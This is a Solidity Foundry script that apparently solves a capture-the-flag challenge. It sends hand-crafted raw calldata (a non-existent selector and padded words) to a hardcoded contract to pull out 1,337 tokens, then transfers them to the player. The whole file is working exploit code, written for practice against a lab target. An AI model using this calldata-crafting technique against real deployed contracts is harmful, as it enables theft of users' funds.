// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import "src/Challenge.sol";

contract SolveContract {
    address constant ONE_EYED_MAN = address(0xCf9997FF3178eE54270735fDc00d4A26730787E0);

    address private owner;
    address public token0;

    constructor(address token) {
        token0 = token;
        owner = msg.sender;
    }

    function solve() public {
        (bool ok, ) = ONE_EYED_MAN.call(
            abi.encodePacked(
                bytes4(0), // non-existent selector
                uint256(0), // msg.data[4] != this
                uint256(0),
                uint256(0), // 100 bytes
                uint256(33),
                uint128(1337 ether),
                uint128(0)
            )
        );
        require(ok, "call failed");

        WBTC(token0).transfer(owner, 1337 ether);
    }
}

contract Solve is Script {
    function run() public {
        Challenge challenge = Challenge(address(vm.envAddress("CHALLENGE_ADDRESS")));
        uint256 PLAYER_PRIVATE_KEY = vm.envUint("PLAYER_PRIVATE_KEY");

        vm.startBroadcast(PLAYER_PRIVATE_KEY);
        new SolveContract(address(challenge.token())).solve();
        vm.stopBroadcast();

        require(challenge.isSolved(), "not solved");
    }
}
